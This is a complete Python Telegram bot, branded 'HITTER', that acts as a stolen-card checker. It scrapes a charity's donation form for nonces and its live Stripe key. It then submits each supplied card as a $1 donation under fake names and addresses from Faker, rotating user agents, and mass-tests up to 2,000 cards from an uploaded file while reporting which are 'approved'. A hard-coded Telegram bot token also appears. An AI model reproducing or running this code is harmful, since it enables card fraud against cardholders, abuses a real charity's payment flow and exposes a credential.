import telebot
import requests
import re
import random
import time
import uuid
import os
import json
from faker import Faker
from bs4 import BeautifulSoup

# Replace with your actual Telegram Bot Token
API_TOKEN = '8075455874:AAGxl7ELCNce4BJtvMn8pDqb2TPr6oPPBrk'

bot = telebot.TeleBot(API_TOKEN)
fake = Faker()

# Modern User Agents for rotation
MODERN_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
]

def get_ids():
    return str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())

def get_form_data(session, ua):
    """Obtain tokens and form data dynamically from the site."""
    try:
        headers = {
            'User-Agent': ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
        }
        r = session.get("https://ccfoundationorg.com/donate/", headers=headers, timeout=15)
        if r.status_code != 200: return None
        
        html = r.text
        soup = BeautifulSoup(html, 'html.parser')
        form = soup.find('form', id='charitable-donation-form')
        
        if not form: return None
        
        data = {}
        for input_tag in form.find_all('input', type='hidden'):
            name = input_tag.get('name')
            if name:
                data[name] = input_tag.get('value')
        
        # Extract Stripe Key
        stripe_vars_match = re.search(r'var CHARITABLE_STRIPE_VARS = (\{.*?\});', html)
        if stripe_vars_match:
            stripe_vars = json.loads(stripe_vars_match.group(1))
            data['pk'] = stripe_vars.get('key')
        else:
            pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', html)
            if pk_match:
                data['pk'] = pk_match.group(0)
        
        required = ['charitable_form_id', '_charitable_donation_nonce', 'campaign_id', 'pk']
        if not all(k in data for k in required): return None
        
        return data
    except Exception as e:
        print(f"Error fetching form data: {e}")
        return None

def create_pm(session, ua, pk, cc, mm, yy, cvc):
    """Create a Stripe payment method."""
    guid, muid, sid = get_ids()
    fn, ln = fake.first_name(), fake.last_name()
    
    headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': ua,
    }
    
    data = {
        'type': 'card',
        'billing_details[name]': f'{fn} {ln}',
        'billing_details[email]': f"{fn.lower()}.{ln.lower()}{random.randint(100, 999)}@gmail.com",
        'billing_details[address][line1]': fake.street_address(),
        'billing_details[address][postal_code]': fake.zipcode(),
        'card[number]': cc,
        'card[cvc]': cvc,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'payment_user_agent': 'stripe.js/33c734767c; stripe-js-v3/33c734767c; card-element',
        'referrer': 'https://ccfoundationorg.com',
        'time_on_page': str(random.randint(5000, 15000)), # Reduced but realistic
        'key': pk,
    }
    
    try:
        r = session.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data, timeout=15)
        res = r.json()
        if r.status_code == 200: return res.get('id'), None
        err = res.get('error', {})
        return None, err.get('message') or err.get('code') or 'Unknown Stripe Error'
    except Exception as e: return None, str(e)

def pay(session, ua, form_data, pm):
    """Execute the donation/payment."""
    fn, ln = fake.first_name(), fake.last_name()
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://ccfoundationorg.com',
        'referer': 'https://ccfoundationorg.com/donate/',
        'user-agent': ua,
        'x-requested-with': 'XMLHttpRequest',
    }
    
    # Dynamic payload from form_data
    payload = {
        'charitable_form_id': form_data['charitable_form_id'],
        form_data['charitable_form_id']: '',
        '_charitable_donation_nonce': form_data['_charitable_donation_nonce'],
        '_wp_http_referer': '/donate/',
        'campaign_id': form_data['campaign_id'],
        'description': form_data.get('description', 'Donation'),
        'ID': '0',
        'donation_amount': 'custom',
        'custom_donation_amount': '1.00',
        'recurring_donation': 'once',
        'title': random.choice(['Mr', 'Mrs', 'Ms']), 
        'first_name': fn,
        'last_name': ln,
        'email': f"{fn.lower()}.{ln.lower()}{random.randint(10,99)}@gmail.com",
        'address': fake.street_address(), 
        'postcode': fake.zipcode(), 
        'city': fake.city(),
        'country': 'GB', # Site uses GBP
        'gateway': 'stripe',
        'stripe_payment_method': pm,
        'action': 'make_donation',
        'form_action': 'make_donation',
    }
    
    try:
        r = session.post("https://ccfoundationorg.com/wp-admin/admin-ajax.php", headers=headers, data=payload, timeout=20)
        res = r.json()
        
        # Proper hit detection
        if res.get('success'): 
            return True, "APPROVED ✅ $1 Charged"
        
        errors = res.get('errors', [])
        if errors:
            msg = errors[0] if isinstance(errors, list) else str(errors)
            # Differentiate between decline and error
            if any(x in msg.lower() for x in ['decline', 'insufficient', 'invalid_cvc', 'expired']):
                return False, f"DEAD ❌ {msg}"
            return None, f"ERROR ⛔️ {msg}"
        
        return False, "DEAD ❌ Card Declined"
    except Exception as e:
        # Fallback check in response text
        resp_text = r.text.lower() if 'r' in locals() else ""
        if any(kw in resp_text for kw in ['thank', 'success', 'approved', 'charged']):
            return True, "APPROVED ✅ $1 Charged (Text Match)"
        return None, f"ERROR ⛔️ Connection Failed"

def check_single_card(card_str):
    """Main logic for checking a single card with retries."""
    parts = re.split(r'[|:/]', card_str.strip())
    if len(parts) < 4:
        return False, "Invalid Format", card_str

    cc, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 4: yy = yy[2:]
    card_info = f"{cc}|{mm}|{yy}|{cvc}"
    
    # Retry logic: up to 2x for errors
    max_retries = 3 # Initial + 2 retries
    for attempt in range(max_retries):
        session = requests.Session()
        ua = random.choice(MODERN_UAS)
        
        form_data = get_form_data(session, ua)
        if not form_data:
            if attempt < max_retries - 1: continue
            return None, "Site Down/Blocked", card_info

        pm, err = create_pm(session, ua, form_data['pk'], cc, mm, yy, cvc)
        if not pm:
            # If it's a card error, don't retry
            if any(x in str(err).lower() for x in ['decline', 'invalid', 'expired', 'cvc']):
                return False, f"DEAD ❌ {err}", card_info
            if attempt < max_retries - 1: continue
            return None, f"ERROR ⛔️ {err}", card_info

        success, result_msg = pay(session, ua, form_data, pm)
        
        if success is True:
            return True, result_msg, card_info
        elif success is False:
            return False, result_msg, card_info
        else:
            # It's an error, retry
            if attempt < max_retries - 1: continue
            return None, result_msg, card_info
            
    return None, "Max Retries Reached", card_info

@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        "꒰ ✅ ꒱   𝗔𝗖𝗖𝗘𝗦𝗦 𝗚𝗥𝗔𝗡𝗧𝗘𝗗  —  𝗛𝗜𝗧𝗧𝗘𝗥\n\n"
        "꒰ 💰 ꒱   𝗠𝗲𝗺𝗯𝗲𝗿𝘀𝗵𝗶𝗽 𝗔𝗰𝘁𝗶𝘃𝗲  ⤵\n"
        "   ▸   status   ·  𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱 ✓\n"
        "   ▸   access   ·  𝗔𝗹𝗹 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝘂𝗻𝗹𝗼𝗰𝗸𝗲𝗱\n\n"
        "꒰ ⚡️ ꒱   𝗚𝗲𝘁 𝗦𝘁𝗮𝗿𝘁𝗲𝗱  ⤵\n\n"
        "   ▸   /𝗰𝗵𝗸     ·  𝗦𝗶𝗻𝗴𝗹𝗲 𝗰𝗵𝗲𝗰𝗸\n"
        "       /m𝗮𝘀𝘀  .  𝗠𝗮𝘀𝘀 𝗰𝗵𝗲𝗰𝗸\n\n"
        "   ❤️  𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗛𝗜𝗧𝗧𝗘𝗥  ⭐️"
    )
    bot.reply_to(message, welcome_text)

@bot.message_handler(commands=['chk'])
def chk_handler(message):
    start_time = time.time()
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /chk xxxxxxxxxxxxxxxx|xx|xx|xxx")
        return

    card_str = args[1]
    proc_msg = bot.reply_to(message, "🔍 Checking...")
    
    success, result_msg, card_info = check_single_card(card_str)
    
    status_label = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅" if success is True else ("𝗗𝗲𝗮𝗱 ❌" if success is False else "𝗘𝗿𝗿𝗼𝗿 ⛔️")
    
    resp_text = (
        f"꒰ {status_label} ꒱  —  𝗦𝘁𝗿𝗶𝗽𝗲\n\n"
        "꒰ 💰 ꒱  𝗖𝗮𝗿𝗱\n"
        f"   ▸  num  · {card_info}\n"
        "   ▸  gate · 𝗦𝘁𝗿𝗶𝗽𝗲 1$\n"
        f"   ▸  resp · {result_msg}\n\n"
        f"🔄  {time.time() - start_time:.2f}s"
    )
    bot.edit_message_text(resp_text, chat_id=message.chat.id, message_id=proc_msg.message_id)

@bot.message_handler(commands=['mass'])
def mass_handler(message):
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "Please reply to a .txt file.")
        return

    start_time = time.time()
    file_info = bot.get_file(message.reply_to_message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    try:
        content = downloaded_file.decode('utf-8')
    except:
        content = downloaded_file.decode('latin-1')
        
    cards = re.findall(r'\d{15,16}[|:/]\d{1,2}[|:/]\d{2,4}[|:/]\d{3,4}', content)
    if not cards:
        bot.reply_to(message, "No valid cards found.")
        return

    cards = cards[:2000]
    total_cards = len(cards)
    charged_count, dead_count, error_count = 0, 0, 0
    
    summary_msg = bot.reply_to(message, "꒰ ⚡️ ꒱   𝗦𝗧𝗥𝗜𝗣𝗘 𝗠𝗔𝗦𝗦  —  𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴...")
    
    def update_summary(status_label="𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴..."):
        elapsed = time.time() - start_time
        total_checked = charged_count + dead_count + error_count
        hit_rate = (charged_count / total_checked * 100) if total_checked > 0 else 0
        text = (
            f"꒰ ⚡️ ꒱   𝗦𝗧𝗥𝗜𝗣𝗘 𝗠𝗔𝗦𝗦  —  {status_label}\n\n"
            "꒰ 🔄 ꒱   𝗦𝘂𝗺𝗺𝗮𝗿𝘆  ⤵\n"
            f"   ▸   𝗰𝗮𝗿𝗱𝘀    · {total_checked}/{total_cards}\n"
            f"   ▸   𝗲𝗹𝗮𝗽𝘀𝗲𝗱  · {int(elapsed)}s\n"
            f"   ▸   𝗵𝗶𝘁 𝗿𝗮𝘁𝗲 · {hit_rate:.1f}%\n\n"
            "꒰ 📰 ꒱   𝗛𝗶𝘁 𝗖𝗼𝘂𝗻𝘁  ⤵\n"
            f"   ▸   💰 𝗖𝗵𝗮𝗿𝗴𝗲𝗱  · {charged_count}\n"
            f"   ▸   ❌ 𝗗𝗘𝗔𝗗     · {dead_count}\n"
            f"   ▸   ⛔️ 𝗘𝗿𝗿𝗼𝗿    · {error_count}"
        )
        try: bot.edit_message_text(text, chat_id=message.chat.id, message_id=summary_msg.message_id)
        except: pass

    for card_str in cards:
        success, result_msg, card_info = check_single_card(card_str)
        
        if success is True:
            charged_count += 1
            hit_text = (
                "꒰ ✅ ꒱   𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱  —  𝗦𝘁𝗿𝗶𝗽𝗲 𝗠𝗔𝗦𝗦\n\n"
                "꒰ 💰 ꒱  𝗖𝗮𝗿𝗱\n"
                f"   ▸  num  · {card_info}\n"
                "   ▸  gate · 𝗦𝘁𝗿𝗶𝗽𝗲 1$\n"
                f"   ▸  resp · {result_msg}\n"
            )
            bot.send_message(message.chat.id, hit_text)
        elif success is False:
            dead_count += 1
        else:
            error_count += 1
        
        # Update summary frequently (every 5 cards or so to avoid rate limits)
        if (charged_count + dead_count + error_count) % 5 == 0:
            update_summary()
    
    update_summary("𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲")

if __name__ == "__main__":
    print("Bot is starting...")
    bot.infinity_polling()
